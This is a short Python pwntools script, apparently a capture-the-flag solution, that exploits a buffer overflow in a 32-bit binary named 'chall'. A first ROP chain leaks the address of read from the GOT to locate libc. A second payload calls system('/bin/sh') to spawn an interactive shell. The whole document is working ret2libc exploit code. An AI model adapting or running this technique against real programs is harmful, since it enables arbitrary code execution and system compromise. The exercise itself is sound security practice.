from pwn import *

p = process("./chall")
elf = ELF("chall")
libc = elf.libc
gadget = 0x080484e9 #  pop esi; pop edi; pop ebp; ret;

'''
ROP Chain 1st

Doing `write(1, read@got, 0x8)`
'''
payload = b"A"*13
payload += p32(elf.plt['write'])
payload += p32(gadget)
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(0x8)

payload += p32(elf.symbols['main']) # `main` address
p.sendline(payload) # Sending 1st payload

read_leaked = u32(p.recv()[:4].strip().ljust(4, b"\x00"))
log.info("read@libc: "+hex(read_leaked))


libc.address = read_leaked - libc.symbols['read']

system = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = b"A"*13
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendline(payload) # Sending the second payload
p.interactive()
